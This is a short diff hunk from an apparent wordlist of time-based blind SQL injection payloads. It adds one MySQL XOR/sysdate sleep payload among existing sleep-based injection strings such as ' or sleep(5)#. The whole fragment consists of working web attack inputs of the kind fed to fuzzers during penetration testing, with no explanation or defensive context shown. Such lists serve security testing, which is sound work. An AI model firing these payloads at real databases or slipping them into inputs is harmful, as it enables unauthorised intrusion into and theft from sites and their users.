@@ -8,6 +8,7 @@ sleep(5)#
  ")) and sleep(2)#
  )) and sleep(2)#
  ')) and sleep(2)#
+ 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
 ' or sleep(5)#
 " or sleep(5)="
 ' or sleep(5)='
